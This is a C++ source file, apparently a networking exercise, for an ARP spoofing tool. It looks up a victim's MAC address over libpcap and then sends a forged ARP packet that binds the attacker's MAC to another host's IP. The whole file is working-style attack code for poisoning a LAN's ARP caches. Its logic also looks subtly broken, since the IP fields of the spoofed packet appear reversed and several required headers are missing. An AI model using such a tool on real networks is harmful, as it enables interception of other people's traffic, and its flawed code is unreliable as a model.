#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getLocalMacAddress(const char* dev) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get local MAC address");
        exit(1);
    }

    close(sock);

    return Mac((const uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac getVictimMac(pcap_t* handle, Mac attacker_mac, Ip sender_ip) {
    EthArpPacket packet_request;
    packet_request.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet_request.eth_.smac_ = attacker_mac;
    packet_request.eth_.type_ = htons(EthHdr::Arp);
    packet_request.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_request.arp_.pro_ = htons(EthHdr::Ip4);
    packet_request.arp_.hln_ = Mac::SIZE;
    packet_request.arp_.pln_ = Ip::SIZE;
    packet_request.arp_.op_ = htons(ArpHdr::Request);
    packet_request.arp_.smac_ = attacker_mac;
    packet_request.arp_.sip_ = htonl(sender_ip);
    packet_request.arp_.tmac_ = Mac::nullMac();
    packet_request.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_request), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(1);
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* raw_packet;
        EthArpPacket* received_packet;
        int res = pcap_next_ex(handle, &header, &raw_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(1);
        }

        received_packet = (EthArpPacket*)raw_packet;
        if (ntohs(received_packet->eth_.type_) != EthHdr::Arp) continue;
        if (received_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
        if (received_packet->arp_.sip_ != htonl(sender_ip)) continue;

        return received_packet->arp_.smac_;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Ip sender_ip = Ip(argv[2]);
    Ip target_ip = Ip(argv[3]);

    Mac attacker_mac = getLocalMacAddress(dev);
    Mac victim_mac = getVictimMac(handle, attacker_mac, sender_ip);

    EthArpPacket packet;

    packet.eth_.dmac_ = victim_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(sender_ip);
    packet.arp_.tmac_ = victim_mac;
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }

    pcap_close(handle);
    return 0;
}

